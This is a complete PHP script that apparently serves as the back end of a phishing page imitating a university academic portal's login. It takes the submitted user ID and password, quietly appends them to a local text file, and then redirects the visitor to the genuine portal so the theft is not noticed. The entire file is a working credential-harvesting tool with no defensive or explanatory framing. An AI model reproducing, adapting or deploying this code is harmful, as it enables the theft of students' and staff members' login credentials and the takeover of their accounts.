<?php
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
$e = $_POST['userid'];
$p = $_POST['password'];


$fd = fopen("duso.txt", "a");
$str = $e . "-" . $p;
fwrite($fd, $str . "\r\n");
fclose($fd);
header("Location: https://siakad.unisda.ac.id/gate/index.php");
